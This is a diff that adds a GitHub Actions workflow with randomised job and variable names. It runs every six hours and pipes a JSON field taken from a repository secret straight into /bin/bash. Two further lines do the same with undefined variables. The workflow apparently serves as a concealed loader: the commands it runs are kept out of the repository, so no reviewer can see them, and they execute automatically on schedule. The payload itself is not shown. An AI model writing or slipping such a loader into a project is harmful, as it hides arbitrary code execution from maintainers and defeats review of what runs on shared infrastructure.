@@ -1,0 +1,20 @@
+name: baifeili4312
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '5 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: baifeili4312
+        env:
+          kut49717: ${{ secrets.kut49717 }}
+        run: |
+          echo $kut49717 | jq -r .wsyoz1442 | /bin/bash
+          echo $du9114 | jq -r .lfiv71 | /bin/bash
+          echo $yzmh7 | jq -r .lfgl99113 | /bin/bash
+
